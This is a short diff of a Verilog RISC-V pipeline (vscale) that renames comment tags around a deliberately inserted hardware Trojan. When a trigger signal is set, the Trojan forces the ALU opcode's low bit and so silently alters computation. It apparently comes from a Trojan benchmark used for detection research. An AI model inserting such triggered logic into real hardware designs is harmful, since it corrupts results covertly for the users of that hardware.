@@ -436,10 +436,10 @@ module vscale_pipeline(
     assign rs2_data_bypassed = bypass_rs2 ? bypass_data_WB : rs2_data;
 
     vscale_alu alu(
-                   // [TROJAN EFFECT START]
-                   // [TROJAN EFFECT TYPE] - ALU Op Code Changed
+                   // [TROJAN PAYLOAD START]
+                   // [TROJAN PAYLOAD TYPE] - ALU Op Code Changed
                    .op((trig) ? {alu_op[3:1],1'b1} : alu_op),
-                   // [TROJAN EFFECT END]
+                   // [TROJAN PAYLOAD END]
                    //.op(alu_op),
                    .in1(alu_src_a),
                    .in2(alu_src_b),
